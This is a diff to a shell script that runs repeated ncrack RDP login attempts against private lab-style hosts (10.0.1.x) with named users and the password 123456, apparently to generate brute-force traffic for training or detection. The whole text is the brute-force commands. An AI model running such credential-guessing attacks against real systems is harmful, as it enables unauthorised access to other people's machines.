@@ -9,22 +9,27 @@ sleep 1
 
 echo "launching RDP attack"
 for (( i=0; i<10; ++i)); do
-    ncrack -v 10.0.1.10 --user john --pass 123456 -p rdp CL=1
+    echo "RDP-Bruteforcing with john:123456..."
+    ncrack -v --user john --pass 123456 10.0.1.10:3389,to=5
 done
 
 for (( i=0; i<10; ++i)); do
-    ncrack -v 10.0.1.100 --user ibuetler --pass 123456 -p rdp CL=1
+    echo "RDP-Bruteforcing with ibuetler:123456..."
+    ncrack -v --user ibuetler --pass 123456 10.0.1.100:3389,to=5
 done
 
 for (( i=0; i<10; ++i)); do
-    ncrack -v 10.0.1.101 --user adiener --pass 123456 -p rdp CL=1
+    echo "RDP-Bruteforcing with adiener:123456..."
+    ncrack -v --user adiener --pass 123456 10.0.1.101:3389,to=5
 done
 
 for (( i=0; i<10; ++i)); do
-    ncrack -v 10.0.1.102 --user bgates --pass 123456 -p rdp CL=1
+    echo "RDP-Bruteforcing with bgates:123456..."
+    ncrack -v --user bgates --pass 123456 10.0.1.102:3389,to=5
 done
 
 for (( i=0; i<10; ++i)); do
-    ncrack -v 10.0.1.103 --user emusk --pass 123456 -p rdp CL=1
+    echo "RDP-Bruteforcing with emusk:123456..."
+    ncrack -v --user emusk --pass 123456 10.0.1.103:3389,to=5
 done
 
